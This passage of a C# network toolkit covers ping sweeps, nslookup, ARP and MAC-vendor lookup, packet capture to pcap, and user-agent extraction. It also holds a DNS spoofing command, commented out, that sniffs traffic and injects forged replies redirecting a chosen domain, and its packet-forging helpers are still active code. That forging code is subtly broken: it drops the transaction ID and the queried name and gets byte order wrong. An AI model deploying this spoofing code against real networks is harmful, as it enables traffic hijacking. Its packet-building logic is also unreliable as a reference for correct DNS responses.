
        private static async Task icmp_ping(string[] args)
        {
            if (args[0] == "help")
            {
                string paddedString = "icmp.ping".PadRight(commandTab, ' ');
                string instruction = "Send a ping request to the target".PadRight(instructionTab, ' ');
                Console.WriteLine($"{paddedString}{instruction}[TARGET_IP]");
                return;
            }
            string ipAddr = args[0];
            if (!IPAddress.TryParse(ipAddr, out IPAddress ipAddress))
            {
                Console.WriteLine("Invalid IP address format.");
                return;
            }

            Console.WriteLine($"\nPinging {ipAddress} with 32 bytes of data:");

            using (Ping pingSender = new Ping())
            {
                for (int i = 0; i <= 3; i++)
                {
                    byte[] buffer = new byte[32];
                    int timeout = 1000;
                    PingReply reply = null;

                    try
                    {
                        reply = pingSender.Send(ipAddress, timeout, buffer);
                    }
                    catch (PingException ex)
                    {
                        Console.ForegroundColor = ConsoleColor.Red;
                        Console.WriteLine($"{ex.Message}\n{ex.StackTrace}");
                        Console.ResetColor();
                        return;
                    }

                    if (reply.Status == IPStatus.Success)
                    {
                        Console.WriteLine($"Reply from {reply.Address}: bytes={reply.Buffer.Length} time={reply.RoundtripTime}ms TTL={reply.Options.Ttl}");
                    }
                    else
                    {
                        Console.WriteLine("Ping request failed with status: " + reply.Status);
                    }
                }
            }
        }

        private static async Task icmp_scan(string[] args)
        {
            if (args[0] == "help")
            {
                string paddedString = "icmp.scan".PadRight(commandTab, ' ');
                string instruction = "Scan the local network for active hosts".PadRight(instructionTab, ' ');
                Console.WriteLine($"{paddedString}{instruction}[IP_RANGE]");
                return;
            }

            IPNetwork2 network = IPNetwork2.Parse(args[0]);

            Console.WriteLine($"\nScanning the local network: {args[0]}...");

            List<Task> pingTasks = new List<Task>();
            List<string> results = new List<string>();
            foreach(IPAddress ip in network.ListIPAddress())
            {
                string targetIp = ip.ToString();

                pingTasks.Add(Task.Run(async () =>
                {
                    using (Ping pingSender = new Ping())
                    {
                        byte[] buffer = new byte[32];
                        int timeout = 1000;

                        try
                        {
                            PingReply reply = await pingSender.SendPingAsync(targetIp, timeout, buffer);

                            if (reply.Status == IPStatus.Success)
                            {
                                string macAddress = Utility.GetMacAddressByARP(reply.Address.ToString());
                                results.Add($"Reply from <{reply.Address}>:\tbytes={reply.Buffer.Length}\ttime={reply.RoundtripTime}ms\tTTL={reply.Options.Ttl}\tMAC=<{macAddress.ToUpper()}>");
                            }
                        }
                        catch (PingException ex)
                        {
                            Console.ForegroundColor = ConsoleColor.Red;
                            Console.WriteLine($"{ex.Message}");
                            Console.ResetColor();
                        }
                    }
                }));
            }

            await Task.WhenAll(pingTasks);
            foreach(string result in results)
            {
                Utility.WriteColor(result, new ConsoleColor[] { ConsoleColor.Red, ConsoleColor.Blue });
            }
        }

        private static async Task dns_nslookup(string[] args)
        {
            if (args[0] == "help")
            {
                string paddedString = "dns.nslookup".PadRight(commandTab, ' ');
                string instruction = "Search IPv4 addresses with domain name".PadRight(instructionTab, ' ');
                Console.WriteLine($"{paddedString}{instruction}[HOSTNAME]");
                return;
            }
            string host = args[0];
            try
            {
                IPHostEntry hostEntry = await Dns.GetHostEntryAsync(host);
                Console.WriteLine($"Host Name: {hostEntry.HostName}");
                foreach (IPAddress address in hostEntry.AddressList)
                {
                    Console.WriteLine($"IP Address: {address}");
                }
            }
            catch (Exception ex)
            {
                Console.ForegroundColor = ConsoleColor.Red;
                Console.WriteLine($"{ex.Message}\n{ex.StackTrace}");
                Console.ResetColor();
            }
        }

        //private static async Task dns_spoof(string[] args)
        //{
        //    if (args[0] == "help")
        //    {
        //        string paddedString = "dns.spoof".PadRight(commandTab, ' ');
        //        string instruction = "Spoof DNS response and redirect target into the given IP address".PadRight(instructionTab, ' ');
        //        Console.WriteLine($"{paddedString}{instruction}[INTERFACE DOMAIN IP]");
        //        return;
        //    }
        //    string Interface = args[0];
        //    ICaptureDevice Device = Utility.GetListenerDevice(Interface);

        //    string targetDomain = args[1];
        //    string targetIP = args[2];

        //    IInjectionDevice packetSender = Utility.GetInjDevice(Interface);
        //    int _packets = 0;
        //    Device.OnPacketArrival += (sender, e) => 
        //    {
        //        var rawPacket = e.GetPacket();

        //        if (rawPacket.LinkLayerType != LinkLayers.Ethernet)
        //            return;

        //        Packet packet = Packet.ParsePacket(rawPacket.LinkLayerType, rawPacket.Data);

        //        if (!(packet is EthernetPacket pkt))
        //            return;
        //        if (packet.PayloadPacket is IPPacket ip)
        //        {
        //            if (ip.PayloadPacket is UdpPacket udp)
        //            {
        //                if (udp.DestinationPort == 53 || udp.SourcePort == 53)
        //                {
        //                    var dns = new DnsPacket(udp.PayloadData);
        //                    Console.WriteLine(dns.Name);
        //                    if (dns.Name.EndsWith(targetDomain))
        //                    {

        //                        var response = Utility.CreateSpoofedDnsResponse(ip, udp, dns, targetIP);
        //                        packetSender.SendPacket(response);
        //                        Utility.LineWriteColor($"\r[+] DNS Redirected: [URL: <{dns.Name}>] [IP: <{targetIP}>]", new ConsoleColor[] { ConsoleColor.Red, ConsoleColor.Blue });
        //                    }
        //                }
        //            }
        //        }
        //    };
        //    Device.Open(DeviceModes.Promiscuous, 0);
        //    Device.StartCapture();
        //    Utility.WriteColor($"[+] DNS spoofing has been started. [TARGET: <{targetDomain}>] [IP: <{targetIP}>]", new ConsoleColor[] { ConsoleColor.Red, ConsoleColor.Blue });
        //    while (true) { }
        //}
    }
    public static class Utility
    {
        public static Dictionary<string, string> ouiDictionary = new Dictionary<string, string>();
        private static readonly string cacheFilePath = $"{Path.GetTempPath()}/oui_cache.txt";
        public static void WriteColor(string message, ConsoleColor[] colors)
        {
            var pieces = Regex.Split(message, @"(<[^>]*>)");
            int idx = 0;

            foreach (string piece in pieces)
            {
                if (piece.StartsWith("<") && piece.EndsWith(">"))
                {
                    Console.ForegroundColor = idx < colors.Length ? colors[idx] : Console.ForegroundColor;
                    Console.Write(piece.Substring(1, piece.Length - 2));
                    idx++;
                }
                else
                {
                    Console.ResetColor();
                    Console.Write(piece);
                }
            }

            Console.ResetColor();
            Console.WriteLine();
        }

        public static void LineWriteColor(string message, ConsoleColor[] colors)
        {
            var pieces = Regex.Split(message, @"(<[^>]*>)");
            int idx = 0;

            foreach (string piece in pieces)
            {
                if (piece.StartsWith("<") && piece.EndsWith(">"))
                {
                    Console.ForegroundColor = idx < colors.Length ? colors[idx] : Console.ForegroundColor;
                    Console.Write(piece.Substring(1, piece.Length - 2));
                    idx++;
                }
                else
                {
                    Console.ResetColor();
                    Console.Write(piece);
                }
            }

            Console.ResetColor();
        }
        public static Dictionary<string, string> GetDevices()
        {
            Dictionary<string, string> Devices = new Dictionary<string, string>();
            var networkInterface = CaptureDeviceList.Instance;
            foreach (var Interface in networkInterface)
            {
                string guid = Interface.Name;
                string friendlyName = Interface.ToString().Split('\n')[1];
                friendlyName = friendlyName.Split(':')[1];
                if (friendlyName != "")
                {
                    friendlyName = friendlyName.Substring(1);
                    Devices[friendlyName] = guid;
                }
            }
            return Devices;
        }
        public static ICaptureDevice GetListenerDevice(string deviceName)
        {
            ICaptureDevice DeviceObject = null;
            Dictionary<string, string> Devices = Utility.GetDevices();
            string guid = Devices[deviceName];
            foreach (var Interface in CaptureDeviceList.Instance)
            {
                if (Interface.Name == guid)
                {
                    DeviceObject = Interface;
                    break;
                }
            }
            return DeviceObject;
        }
        public static LibPcapLiveDevice GetSenderDevice(string deviceName)
        {
            ICaptureDevice DeviceObject = null;
            Dictionary<string, string> Devices = Utility.GetDevices();
            string guid = Devices[deviceName];
            foreach (var Interface in CaptureDeviceList.Instance)
            {
                if (Interface.Name == guid)
                {
                    DeviceObject = Interface;
                    break;
                }
            }
            return DeviceObject as LibPcapLiveDevice;
        }
        public static IInjectionDevice GetInjDevice(string deviceName)
        {
            ICaptureDevice DeviceObject = null;
            Dictionary<string, string> Devices = Utility.GetDevices();
            string guid = Devices[deviceName];
            foreach (var Interface in CaptureDeviceList.Instance)
            {
                if (Interface.Name == guid)
                {
                    DeviceObject = Interface;
                    break;
                }
            }
            return DeviceObject as IInjectionDevice;
        }
        public static string GetRouterIPAddress()
        {
            string ipAddress = "";
            foreach (NetworkInterface ni in NetworkInterface.GetAllNetworkInterfaces())
            {
                if (ni.OperationalStatus == OperationalStatus.Up)
                {
                    foreach (GatewayIPAddressInformation gw in ni.GetIPProperties().GatewayAddresses)
                    {
                        if (gw.Address.AddressFamily == System.Net.Sockets.AddressFamily.InterNetwork)
                        {
                            ipAddress = gw.Address.ToString();
                            break;
                        }
                    }
                    if (!string.IsNullOrEmpty(ipAddress))
                        break;
                }
            }
            return ipAddress;
        }

        public static PhysicalAddress GetMacAddress(string Interface, LibPcapLiveDevice device, IPAddress ipAddress)
        {
            ArpPacket arpRequest = new ArpPacket(
                ArpOperation.Request,
                PhysicalAddress.Parse("00:00:00:00:00:00"),
                ipAddress,
                device.MacAddress,
                IPAddress.Parse(Utility.GetRouterIPAddress()));

            EthernetPacket ethernetPacket = new EthernetPacket(
                device.MacAddress,
                PhysicalAddress.Parse("FF:FF:FF:FF:FF:FF"),
                EthernetType.Arp);

            ethernetPacket.PayloadPacket = arpRequest;

            device.SendPacket(ethernetPacket);

            PacketCapture packet;
            ICaptureDevice Listener = Utility.GetListenerDevice(Interface);
            Listener.Open(DeviceModes.Promiscuous, 0);
            while ((Listener.GetNextPacket(out packet)) != null)
            {
                var eth = Packet.ParsePacket(packet.GetPacket().LinkLayerType, packet.GetPacket().Data) as EthernetPacket;
                if (eth != null && eth.Type == EthernetType.Arp)
                {
                    var arp = (ArpPacket)eth.PayloadPacket;
                    if (arp.SenderProtocolAddress.Equals(ipAddress))
                    {
                        return arp.SenderHardwareAddress;
                    }
                }
            }

            throw new Exception($"MAC address for {ipAddress} not found.");
        }

        public static string GetMacAddressByARP(string ipAddress)
        {
            ProcessStartInfo startInfo = new ProcessStartInfo
            {
                FileName = "arp",
                Arguments = "-a " + ipAddress,
                RedirectStandardOutput = true,
                UseShellExecute = false,
                CreateNoWindow = true
            };

            using (Process process = Process.Start(startInfo))
            {
                using (System.IO.StreamReader reader = process.StandardOutput)
                {
                    string output = reader.ReadToEnd();
                    string[] lines = output.Split(new[] { Environment.NewLine }, StringSplitOptions.RemoveEmptyEntries);
                    foreach (var line in lines)
                    {
                        if (line.Contains(ipAddress))
                        {
                            string[] parts = line.Split(new[] { ' ' }, StringSplitOptions.RemoveEmptyEntries);
                            if (parts.Length >= 2)
                            {
                                return parts[1];
                            }
                        }
                    }
                }
            }
            return "MAC Not Found";
        }
        public static async Task LoadOuiDatabase()
        {
            string url = "https://standards-oui.ieee.org/oui/oui.txt";
            string newContent;

            if (File.Exists(cacheFilePath))
            {
                var cachedContent = File.ReadAllText(cacheFilePath);
                LoadFromCache(cachedContent);
                return;
            }

            using (var client = new HttpClient())
            {
                newContent = await client.GetStringAsync(url);
            }

            var lines = newContent.Split(new[] { "\r\n", "\r", "\n" }, StringSplitOptions.None);

            foreach (var line in lines)
            {
                if (line.Contains("(base 16)"))
                {
                    var parts = line.Split(new[] { "(base 16)" }, StringSplitOptions.None);
                    var oui = parts[0].Trim().Replace("-", "").ToUpper();
                    var company = parts[1].Trim();
                    if (!ouiDictionary.ContainsKey(oui))
                    {
                        ouiDictionary[oui] = company;
                    }
                }
            }

            File.WriteAllText(cacheFilePath, newContent);
        }
        private static void LoadFromCache(string cachedContent)
        {
            var lines = cachedContent.Split(new[] { "\r\n", "\r", "\n" }, StringSplitOptions.None);

            foreach (var line in lines)
            {
                if (line.Contains("(base 16)"))
                {
                    var parts = line.Split(new[] { "(base 16)" }, StringSplitOptions.None);
                    var oui = parts[0].Trim().Replace("-", "").ToUpper();
                    var company = parts[1].Trim();
                    if (!ouiDictionary.ContainsKey(oui))
                    {
                        ouiDictionary[oui] = company;
                    }
                }
            }
        }

        public static string GetManufacturer(string macAddress)
        {
            string oui = macAddress.Substring(0, 6).ToUpper().Replace(":", "");
            return ouiDictionary.TryGetValue(oui, out string manufacturer) ? manufacturer : "Unknown Manufacturer";
        }
        public static string ExtractUserAgent(string packetInfo)
        {
            string pattern = @"User-Agent: ([^\r\n]+)";
            Match match = Regex.Match(packetInfo, pattern);
            if (match.Success)
            {
                return match.Groups[1].Value;
            }
            return null;
        }

        public static string ExtractIPAddress(string packetInfo)
        {
            string pattern = @"SourceAddress=(\d+\.\d+\.\d+\.\d+)";
            Match match = Regex.Match(packetInfo, pattern);
            if (match.Success)
            {
                return match.Groups[1].Value;
            }
            return null;
        }

        public static Packet CreateSpoofedDnsResponse(IPPacket ipPacket, UdpPacket udpPacket, DnsPacket dns, string fakeIp)
        {
            var fakeIpAddr = IPAddress.Parse(fakeIp);
            var dnsResponse = dns.CreateResponse(fakeIpAddr);

            var spoofedUdp = new UdpPacket(udpPacket.DestinationPort, udpPacket.SourcePort)
            {
                PayloadData = dnsResponse
            };
            var spoofedIp = new IPv4Packet(ipPacket.DestinationAddress, ipPacket.SourceAddress)
            {
                PayloadData = spoofedUdp.Bytes
            };

            return spoofedIp;
        }
    }
    public class PcapStream : IDisposable
    {
        private Stream BaseStream;
        private bool headerWritten = false;

        public PcapStream(Stream BaseStream)
        {
            this.BaseStream = BaseStream;
        }

        public void WriteGlobalHeader()
        {
            // PCAP Global Header (24 bytes)
            byte[] globalHeader = new byte[24];
            globalHeader[0] = 0xd4; // Magic number (PCAP format)
            globalHeader[1] = 0xc3;
            globalHeader[2] = 0xb2;
            globalHeader[3] = 0xa1;

            globalHeader[4] = 0x02; // Version major
            globalHeader[5] = 0x00;

            globalHeader[6] = 0x04; // Version minor
            globalHeader[7] = 0x00;

            // This assumes no time zone correction, accuracy, or snaplen limit.
            Array.Copy(BitConverter.GetBytes(0), 0, globalHeader, 8, 4); // Timezone offset (usually 0)
            Array.Copy(BitConverter.GetBytes(0), 0, globalHeader, 12, 4); // Accuracy of timestamps
            Array.Copy(BitConverter.GetBytes(65535), 0, globalHeader, 16, 4); // Max packet size (snaplen)
            Array.Copy(BitConverter.GetBytes((int)LinkLayers.Ethernet), 0, globalHeader, 20, 4); // Link-layer type (Ethernet)

            BaseStream.Write(globalHeader, 0, globalHeader.Length);
            BaseStream.Flush();
        }

        public void Write(RawCapture packet)
        {
            if (!headerWritten)
            {
                WriteGlobalHeader();
                headerWritten = true;
            }

            byte[] arr = new byte[packet.Data.Length + 16];

            byte[] sec = BitConverter.GetBytes((uint)packet.Timeval.Seconds);
            byte[] msec = BitConverter.GetBytes((uint)packet.Timeval.MicroSeconds);
            byte[] incllen = BitConverter.GetBytes((uint)packet.Data.Length);
            byte[] origlen = BitConverter.GetBytes((uint)packet.Data.Length);

            Array.Copy(sec, arr, sec.Length);
            int offset = sec.Length;
            Array.Copy(msec, 0, arr, offset, msec.Length);
            offset += msec.Length;
            Array.Copy(incllen, 0, arr, offset, incllen.Length);
            offset += incllen.Length;
            Array.Copy(origlen, 0, arr, offset, origlen.Length);
            offset += origlen.Length;
            Array.Copy(packet.Data, 0, arr, offset, packet.Data.Length);

            BaseStream.Write(arr, 0, arr.Length);

            BaseStream.Flush();
        }

        public void Dispose()
        {
            BaseStream?.Dispose();
        }
    }

    public class DnsPacket
    {
        public string Name { get; set; }
        public ushort Type { get; set; }
        public ushort Class { get; set; }

        public DnsPacket(byte[] payloadData)
        {
            // Parse the DNS header (12 bytes)
            // Skipping first 12 bytes (Header)
            int offset = 12;

            // Parsing the DNS Question (Name, Type, Class)
            Name = ParseDomainName(payloadData, ref offset);
            Type = BitConverter.ToUInt16(payloadData, offset);
            offset += 2;
            Class = BitConverter.ToUInt16(payloadData, offset);
            offset += 2;
        }

        private string ParseDomainName(byte[] data, ref int offset)
        {
            string domainName = "";
            while (data[offset] != 0)
            {
                int len = data[offset++];
                domainName += Encoding.ASCII.GetString(data, offset, len) + ".";
                offset += len;
            }
            offset++; // Skip the null byte at the end
            return domainName.TrimEnd('.');
        }

        public byte[] CreateResponse(IPAddress fakeIp)
        {
            // This function creates a basic DNS response payload with the fake IP
            byte[] response = new byte[32]; // Example fixed size; adjust as needed
            Array.Copy(new byte[] { 0x81, 0x80 }, 0, response, 2, 2);  // Flags: standard response, no error
            Array.Copy(new byte[] { 0x00, 0x01 }, 0, response, 6, 2);  // Answer count: 1

            // Copy the question section (Name, Type, Class) from the original request
            Array.Copy(BitConverter.GetBytes(Type), 0, response, 12, 2);
            Array.Copy(BitConverter.GetBytes(Class), 0, response, 14, 2);

            // Insert the answer section (Name, Type, Class, TTL, Data length, Fake IP)
            int offset = 16;
            Array.Copy(BitConverter.GetBytes(Type), 0, response, offset, 2); offset += 2;
            Array.Copy(BitConverter.GetBytes(Class), 0, response, offset, 2); offset += 2;
            Array.Copy(new byte[] { 0x00, 0x00, 0x00, 0x3C }, 0, response, offset, 4); offset += 4;  // TTL: 60 seconds
            Array.Copy(new byte[] { 0x00, 0x04 }, 0, response, offset, 2); offset += 2;  // Data length: 4 bytes (IPv4)
            Array.Copy(fakeIp.GetAddressBytes(), 0, response, offset, 4); // Fake IP

            return response;
        }
    }
}